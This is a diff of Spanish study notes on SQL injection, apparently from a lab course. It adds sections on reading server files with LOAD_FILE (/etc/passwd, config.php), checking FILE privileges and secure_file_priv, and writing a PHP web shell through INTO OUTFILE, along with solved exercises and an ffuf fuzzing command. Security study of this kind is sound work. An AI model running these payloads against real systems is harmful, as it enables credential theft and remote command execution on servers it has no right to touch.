@@ -3,7 +3,6 @@ Status: #idea
 Tags: 
 
 # SQL Injections
-
 - [[#SQL Injection (SQLi)|SQL Injection (SQLi)]]
 - [[#Syntax Errors|Syntax Errors]]
 - [[#Tipos de SQL Injections|Tipos de SQL Injections]]
@@ -30,6 +29,18 @@ Tags:
 		- [[#INFORMATION_SCHEMA Database#COLUMNS|COLUMNS]]
 		- [[#INFORMATION_SCHEMA Database#Data|Data]]
 	- [[#Enumeración de base de datos#Ejercicio Resuelto|Ejercicio Resuelto]]
+- [[#Leyendo ficheros|Leyendo ficheros]]
+	- [[#Leyendo ficheros#Privilegios|Privilegios]]
+		- [[#Privilegios#DB User|DB User]]
+		- [[#Privilegios#Privilegios de usuario|Privilegios de usuario]]
+		- [[#Privilegios#LOAD_FILE|LOAD_FILE]]
+		- [[#Privilegios#Ejercicio Resuelto|Ejercicio Resuelto]]
+- [[#Escribiendo ficheros|Escribiendo ficheros]]
+	- [[#Escribiendo ficheros#secure_file_priv|secure_file_priv]]
+	- [[#Escribiendo ficheros#SELECT INTO OUTFILE|SELECT INTO OUTFILE]]
+	- [[#Escribiendo ficheros#Escribiendo en ficheros con SQL Injection|Escribiendo en ficheros con SQL Injection]]
+	- [[#Escribiendo ficheros#Escribiendo una Web Shell|Escribiendo una Web Shell]]
+	- [[#Escribiendo ficheros#Ejercicio Resuelto|Ejercicio Resuelto]]
 
 
 La mayoría de aplicaciones tienen una base de datos para guardar información de lo que sucede en la aplicación. Para conseguir que la web sea dinámica, se necesita interactuar en tiempo real con la base de datos.
@@ -638,6 +649,300 @@ cn' UNION SELECT 1,password,3,4 from ilfreight.users WHERE username = 'newuser' 
 
 Y esto nos proporcionará la flag que necesitamos.
 
+## Leyendo ficheros
+
+A parte de recuperar datos de la base de datos, una inyección SQL puede servir para muchas otras operaciones, como leer o escribir ficheros en el servidor, pudiendo incluso ganar un RCE en el servidor.
+
+### Privilegios
+
+Leer datos es mucho más común que escribir datos, por lo tanto el usuario necesitará permisos explícitos para esto. Por ejemplo, para subir un archivo SQL y volcar los datos en una tabla, en MySQL, se necesitaría el permiso FILE, por lo que tendremos que saber si nuestro usuario tiene esta operación permitida para realizarla.
+
+#### DB User
+
+Antes de nada deberemos saber que usuario de la base de datos somos, lo cual podemos conseguir con la función user() o cualquier de estas 3 queries:
+
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+Nuestra payload con UNION quedará de la siguiente manera:
+
+```sql
+cn' UNION SELECT 1, user(), 3, 4-- -
+```
+
+O así:
+
+```sql
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+```
+
+Lo que nos dirá que usuario somos actualmente:
+
+![[Pasted image 20241127202020.png]]
+
+Si conseguimos un usuario root, es muy buena señal, ya que suele ser el usuario con permisos máximos.
+
+#### Privilegios de usuario
+
+Para listar los privilegios de nuestro usuario podríamos usar este payload, ya que listará los privilegios de todos los usuarios:
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+```
+
+O este payload, que es específico a un usuario:
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+```
+
+Vemos como la query devuelve Y, que es YES, indicando que tenemos privilegios de superusuario.
+
+![[Pasted image 20241127202223.png]]
+
+Si queremos ver los permisos de manera individual, podremos ejecutar el siguiente payload:
+
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+Devolviéndonos lo siguiente:
+
+![[Pasted image 20241127202505.png]]
+
+Como podemos ver, el permiso FILE está listado.
+
+#### LOAD_FILE
+
+Ahora que sabemos que tenemos privilegios suficientes, podremos intentar cargar un archivo para leer los datos que contiene, ya que MySQL/MariaDB tienen una función llamada LOAD_FILE() que nos permite exactamente esto.
+
+Con esta payload, podríamos leer el fichero /etc/passwd:
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+
+![[Pasted image 20241127202713.png]]
+
+Devolviéndonos así el contenido del fichero.
+
+Otro ejemplo, podríamos leer ficheros dentro del servidor, por ejemplo, sabemos que estamos usando el fichero search.php, por lo tanto podríamos hacer lo siguiente:
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+```
+
+![[Pasted image 20241127202803.png]]
+
+Siendo interesante ver el código source, ya que nos encontraremos una sorpresa. Podemos ver el contenido del fichero php en texto plano.
+
+![[Pasted image 20241127202835.png]]
+
+#### Ejercicio Resuelto
+
+En este ejercicio se nos pide que descubramos de donde viene la variable $conn, ya que seguramente venga de un fichero importado con require, el problema es que no sabemos que ficheros hay en el servidor.
+
+Para esto lanzo este comando de fuff con nuestro objetivo, y filtrando por extensión php:
+
+```shell
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.60.154:36506/FUZZ.php -ic
+```
+
+![[Captura de pantalla 2024-11-27 a las 20.33.13.png]]
+
+
+Vemos en los resultados que es un fichero llamado config.php, por lo tanto podremos incluirlo con nuestra inyección SQL y leerlo con la siguiente payload:
+
+```sql
+cn' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4 -- -
+```
+
+Y esto nos devolverá el fichero de configuración en texto plano, lo que nos permite leer la contraseña de la base de datos.
+
+## Escribiendo ficheros
+
+Cuando hablamos de escribir ficheros nos encontramos con que es una funcionalidad mucho más restringida en DBMS modernos, ya que esto nos permitiría escribir una web shell y ganar control total de este. 
+
+Por esta misma razón, tendremos que comprobar que esta operación está entre nuestros permisos.
+
+Para que podamos escribir en ficheros se deben cumplir estes 3 requisitos:
+
+- Usuario tiene privilegios FILE.
+- La variable global de MySQL secure_file_priv no está habilitada.
+- Tener permisos de escritura en el directorio del servidor back-end que queramos escribir.
+
+### secure_file_priv
+
+Esta variable determina desde donde se pueden leer/escribir archivos. Un valor vacío nos permite leer ficheros del sistema entero. 
+
+Mientras que, si un directorio está especificado en esta variable, solo podremos leer en este directorio. 
+
+Por otra parte, NULL nos indica que no podremos leer ni escribir desde ningún directorio. 
+
+MariaDB por defecto tiene la variable a una cadena vacía, lo que nos permitiría leer/escribir a cualquier fichero si el usuario tiene privilegios de FILE. De todas maneras, MySQL usa la carpeta /var/lib/mysql-files como directorio default. Esto quiere decir, que leer ficheros con una inyección SQL no es posible con ajustes por defecto. Y aún peor, hay algunas configuraciones más modernas que lo inicializan a NULL, no pudiendo leer/escribir.
+
+Podemos usar la siguiente query para ver el valor de esta variable:
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+Pero, si estamos usando una inyección UNION, tendremos que obtener el valor usando un SELECT. 
+
+Esto no sería un problema ya que las variables globales se pueden llamar desde INFORMATION_SCHEMA, en la tabla GLOBAL_VARIABLES.
+
+Esto resultaría en la siguiente payload:
+
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+Mostrando por pantalla el nombre de la variable y el valor, en este caso es '', por lo tanto podremos leer/escribir en cualquier parte del sistema.
+
+![[Pasted image 20241127204604.png]]
+
+Ahora que sabemos que nuestro usuario puede escribir en el back-end, vamos a probarlo.
+
+### SELECT INTO OUTFILE
+
+Para usar este statement, podremos añadir INTO OUTFILE '...' después de nuestra query para exportar los resultados en un fichero específicado. El ejemplo de abajo guarda el resultado de users en el directorio 'tmp/credentials':
+
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+Si volvemos al servidor del back-end, veremos el siguiente fichero y su contenido:
+
+```shell
+cat /tmp/credentials 
+
+1       admin   392037dbba51f692776d6cefb6dd546d
+2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
+```
+
+También podremos escribir lo que queramos en el fichero con los SELECT de la siguiente manera:
+
+```sql
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
+```shell
+cat /tmp/test.txt 
+
+this is a test
+```
+
+```shell
+ls -la /tmp/test.txt 
+
+-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
+```
+
+Como podemos ver, el archivo ha sido creado por el usuario mysql.
+
+> [!TIP]
+> La exportación de ficheros avanzada utiliza la función 'FROM_BASE64("base64_data")' para conseguir escribir ficheros más largos/avanzados, incluyendo data binaria.
+
+
+### Escribiendo en ficheros con SQL Injection
+
+Vamos a escribir un fichero para comprobar que esto está funcionando bien. La query de abajo escribirá file written succesfully! en el fichero proof.txt
+
+```sql
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+```
+
+> [!DANGER] IMPORTANTE
+> Para poder escribir una webshell deberemos saber en que directorio está el servidor web (web root). Una manera de saber esto es usando LOAD_FILE con el fichero de configuración del servidor.
+> - Para Apache es: `/etc/apache2/apache2.conf`
+> - Para NGINX es: `/etc/nginx/nginx.conf`
+> - Para ISS es: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
+> 
+> Incluso podríamos hacer un fuzzing scan y probar a escribir ficheros a diferentes web roots posibles, usando  [esta wordlist para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [esta wordlist para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
+> 
+> Finalmente, si esto tampoco funciona, podríamos usar los errores de servidores que se dan, al por ejemplo, poner rutas mal, etc, e identificar el web directory de esa manera.
+
+Nos quedaría así la payload final:
+
+```sql
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+```
+
+No vemos ningún error, por lo que posiblemente haya funcionado. Y podremos comprobar que efectivamente ha funcionado al ir a /proof.txt en nuestro servidor.
+
+![[Pasted image 20241127210138.png]]
+
+Se puede ver como en el fichero se han introducido los valores 1,3,4 ya que esto es por la inyección, podremos solucionar esto poniendo los valores "" en la inyección en vez de números.
+
+### Escribiendo una Web Shell
+
+Todo apunta a que podemos conseguir una shell, por lo tanto aquí tenemos una shell oneliner de php:
+
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+Dejando la payload así:
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+Vemos como no hay errores, por lo tanto todo indica que ha funcionado bien.
+
+![[Pasted image 20241127210418.png]]
+
+Podremos verificar que todo funciona bien accediendo a la ruta /shell.php en nuestro navegador, ejecutando los comandos a través del parámetro 0, por ejemplo, /shell.php?0=id
+
+Devolviéndonos esto:
+
+![[Pasted image 20241127210524.png]]
+
+Esto nos confirma que estamos ejecutando comandos como el usuario www-data.
+
+### Ejercicio Resuelto
+
+Se nos presenta la misma web que antes, por lo tanto ya sabemos que tenemos permisos de FILE. 
+
+Ahora necesitamos saber si secure_file_priv está habilitada y que valor tiene, por lo que con esta payload sería posible:
+
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+![[Captura de pantalla 2024-11-27 a las 21.07.16.png]]
+
+Posteriormente vemos que está vacía, por lo tanto se puede leer y escribir en cualquier parte del servidor.
+
+Ahora necesitaremos determinar cual es la ruta del webserver, pero como ya lo sabíamos del anterior ejercicio, pasamos a hacer la siguiente payload:
+
+```sql
+cn' UNION SELECT 1,'this is a test',3,4 into outfile '/var/www/html/proof.txt' -- -
+```
+
+Lo que nos aportará este archivo dentro del servidor, que podremos acceder desde nuestro navegador.
+
+![[Captura de pantalla 2024-11-27 a las 21.09.08.png]]
+
+El siguiente paso: hacer una webshell.
+
+Como vimos antes, es sencillo abrir una webshell con php y mandar comandos por parámetro get, lo que nos permitiría finalizar este ejercicio. Para eso creo esta payload:
+
+```sql
+cn' UNION SELECT 1,'<?php system($_REQUEST[0]);?>',3,4 into outfile '/var/www/html/shell.php' -- -
+```
+
+Lo que nos permite ver el contenido del directorio. Ahora solo faltaría encontrar la flag.
+
+> [!TIP]
+> Cuando uses este tipo de web shell, recuerda que la mayoría de comandos funciona, pero algunos como las concatenaciones no. Por lo tanto, no podrías hacer un cd .. && ls, si no que tendrías que hacer directamente ls .. o ls ../.. para ir navegando por la máquina.
+> 
+
+![[Captura de pantalla 2024-11-27 a las 21.10.57.png]]
 
 ---
+
 # {{References}}
